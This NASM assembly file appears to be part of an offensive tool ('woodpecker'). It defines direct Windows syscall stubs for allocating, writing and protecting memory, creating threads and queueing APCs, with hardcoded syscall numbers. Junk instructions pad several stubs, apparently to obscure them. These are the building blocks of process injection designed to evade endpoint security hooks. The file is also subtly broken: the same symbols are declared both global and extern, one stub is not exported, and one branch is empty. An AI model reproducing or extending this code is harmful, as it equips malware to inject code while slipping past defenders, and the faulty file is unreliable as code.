; woodpecker_assm.asm
; NASM syntax - compatible with nasm -f win64

global NtAllocateMemory
global NtWriteMemory
global NtProtectMemory
global NtCreateThd
global NtQueueApc2

extern NtAllocateMemory
extern NtWriteMemory
extern NtProtectMemory
extern NtCreateThd
extern NtQueueApc2

section .text

NtAllocateMemory:
    mov r8, r10
    xor r10, r10
    mov r10, 0x0A        
    mov r10, rcx
    xor eax, eax
    sub r8, r10
    add eax, 0x18
    xor r8, r8
    syscall
    ret

NtWriteMemory:
    add rcx, 0x0A
    xor eax, eax
    mov r10, rcx
    add eax, 0x3A
    sub r10, 0x0A
    sub rcx, 0x0A
    syscall
    ret

NtProtectMemory:
    add r10, 0x1C
    xor eax, eax
    mov r10, rcx
    sub r10, 0x1
    add eax, 0x50
    add r10, 0x1
    syscall
    ret

NtQueueApc2: 
    mov r10, rcx
    mov eax, 0x171
    syscall
    ret

NtQueueApc: 
    mov r10, rcx
    mov eax, 0x170
    syscall
    ret

NtCreateThd:
    mov r10, rcx
    mov eax, 0xC7
    syscall
    test rax, rax
    jz .done


.done:
    ret
